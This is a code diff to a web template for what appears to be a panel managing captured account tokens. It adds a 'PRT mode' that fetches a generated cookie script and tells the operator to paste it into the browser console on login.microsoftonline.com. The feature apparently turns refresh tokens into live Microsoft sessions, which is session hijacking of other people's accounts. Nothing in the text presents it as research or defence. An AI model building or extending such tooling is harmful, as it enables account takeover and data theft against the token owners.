@@ -199,10 +199,24 @@
                         <div class="action-group">
 
                             <!-- OPEN MAIL -->
-                           @if($token->status !== 'dead')
-<a href="/switch-account/{{ $token->id }}" target="_blank">
-    <button class="btn-icon btn-mail">📧</button>
-</a>
+                          @if($token->status !== 'dead')
+
+    @if(!empty($token->prt))
+        <!-- 🔥 PRT MODE -->
+        <button 
+            class="btn-icon btn-mail"
+            onclick="openPrtModal({{ $token->id }})"
+            title="Generate Cookie Script"
+        >
+            ⚡
+        </button>
+    @else
+        <!-- NORMAL LOGIN -->
+        <a href="/switch-account/{{ $token->id }}" target="_blank">
+            <button class="btn-icon btn-mail">📧</button>
+        </a>
+    @endif
+
 @else
 <button class="btn-icon btn-mail" style="opacity:0.3;cursor:not-allowed;">
     📧
@@ -211,11 +225,7 @@
 
 @if(!auth()->user()->isSubUser())
                             <!-- COPY TOKEN -->
-                            <button class="btn-icon btn-copy"
-    title="Copy full token"
-    onclick="copyToken('{{ $token->access_token }}')">
-    📋
-</button>
+                            <button id="copyBtn" onclick="copyPrt()" class="btn-icon btn-copy">📋 Copy</button>
                             <!-- DELETE -->
                             <form action="/tokens/{{ $token->id }}" method="POST">
                                 @csrf
@@ -239,6 +249,32 @@
 
     </div>
 
+</div>
+
+<div id="prtModal" style="display:none; position:fixed; inset:0; background:#000000aa; z-index:9999; align-items:center; justify-content:center;">
+
+    <div style="background:#111; border-radius:10px; width:500px; padding:20px; box-shadow:0 0 20px #00ffcc; position:relative;">
+
+        <div style="font-weight:bold; color:#00ffcc; margin-bottom:10px;">
+            🍪 COOKIE SCRIPT
+        </div>
+
+        <div style="font-size:13px; color:#ccc; margin-bottom:15px;">
+            1. Open https://login.microsoftonline.com in Chrome/Edge<br>
+            2. Press F12 → Console<br>
+            3. Paste script & Enter<br>
+            4. Wait ~3 seconds
+        </div>
+
+        <textarea id="prtScript"
+            style="width:100%; height:150px; background:#000; color:#00ffcc; border:1px solid #00ffcc; padding:10px; font-size:12px;"></textarea>
+
+        <div style="margin-top:10px; display:flex; justify-content:space-between;">
+            <button onclick="copyPrt()" class="btn-icon btn-copy">📋 Copy</button>
+            <button onclick="closePrtModal()" class="btn-icon btn-delete">Close</button>
+        </div>
+
+    </div>
 </div>
 
 <script>
@@ -302,6 +338,68 @@ setInterval(fetchTokenStatus, 5000);
 
 // run pertama kali
 fetchTokenStatus();
+</script>
+
+<script>
+
+let currentTokenId = null;
+
+function openPrtModal(tokenId) {
+    currentTokenId = tokenId;
+
+    document.getElementById('prtModal').style.display = 'flex';
+
+    const textarea = document.getElementById('prtScript');
+    const copyBtn = document.getElementById('copyBtn');
+
+    textarea.value = "Generating cookie...";
+    copyBtn.disabled = true;
+
+    fetch(`/tokens/${tokenId}/cookie`)
+        .then(res => res.json())
+        .then(data => {
+
+            if (data.error) {
+                textarea.value = "❌ " + data.error;
+                return;
+            }
+
+            textarea.value = data.script;
+            copyBtn.disabled = false;
+
+        })
+        .catch(() => {
+            textarea.value = "❌ Failed generate script";
+        });
+}
+document.getElementById('prtModal').addEventListener('click', function(e){
+    if(e.target.id === 'prtModal'){
+        closePrtModal();
+    }
+});
+
+function closePrtModal() {
+    document.getElementById('prtModal').style.display = 'none';
+}
+
+function copyPrt() {
+    const text = document.getElementById('prtScript').value;
+    navigator.clipboard.writeText(text);
+
+    const msg = document.createElement('div');
+    msg.innerText = "Script copied!";
+    msg.style.position = "fixed";
+    msg.style.bottom = "20px";
+    msg.style.right = "20px";
+    msg.style.background = "#00ff95";
+    msg.style.color = "#000";
+    msg.style.padding = "10px 15px";
+    msg.style.borderRadius = "6px";
+    document.body.appendChild(msg);
+
+    setTimeout(() => msg.remove(), 1500);
+}
+
 </script>
 
 @endsection
